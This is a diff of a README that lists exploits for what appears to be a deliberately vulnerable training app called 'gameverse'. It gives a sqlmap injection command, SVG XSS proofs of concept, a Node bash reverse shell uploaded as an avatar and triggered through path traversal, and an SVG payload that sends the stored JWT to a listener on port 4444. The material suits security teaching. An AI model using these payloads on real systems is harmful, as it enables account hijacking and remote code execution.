@@ -85,19 +85,23 @@ docker run -p 3333:3333 -v $(pwd)/gameverse.db:/home/appuser/app/gameverse.db ga
 ### SQLi in `/users`
 Example with sqlmap:
 ```bash
-sqlmap -u "10.3.10.182:3333/users/?q=*" --headers="Authorization: Bearer <JWT>" --code 200 --tables --tamper=space2comment --risk 3 --level 5
+sqlmap -u "10.3.10.182:3333/users/?q=*" --headers="Authorization: Bearer <JWT>" --tables --risk 3 --level 5
 ```
 
 ---
 
+### Plaintext passwords in the database
+
+---
+
 ### XSS via avatar URL (using `<object>`)
-Create SVG:
+Create SVG (POC):
 ```xml
 <svg xmlns="http://www.w3.org/2000/svg">
   <script>alert(1)</script>
 </svg>
 ```
-Embed the SVG like this:
+Embed the SVG like this when you send a message to another user:
 ```html
 <object data="uploaded.svg" type="image/svg+xml"></object>
 ```
@@ -105,33 +109,21 @@ Embed the SVG like this:
 ---
 
 ### Eval-based plugin RCE for admins
+Create a .js file and upload it as an avatar with:
 ```js
 require('child_process').exec('bash -c "bash -i >& /dev/tcp/localhost/4444 0>&1"');
 ```
-
----
-
-### Path traversal against plugins
-```plaintext
-Upload .js outside plugins using ../ in the path – see the LFI example below.
-```
+Then access it with path traversal in the admin plugin system
 
 ---
 
 ### JWT exfiltration via XSS
+Post the following in the forum section (example):
 ```xml
 <svg>
   <animate onend="new Image().src='//localhost:4444/jwt?d='+encodeURIComponent(localStorage.getItem('jwtToken'))" dur="1s" attributeName="x"/>
-</svg>
 ```
-
----
-
-### Plaintext passwords in the database
-```bash
-sqlite3 gameverse.db
--- view all users and passwords in plaintext!
-```
+Then catch the the token with nc -lvnp 4444
 
 ---
 
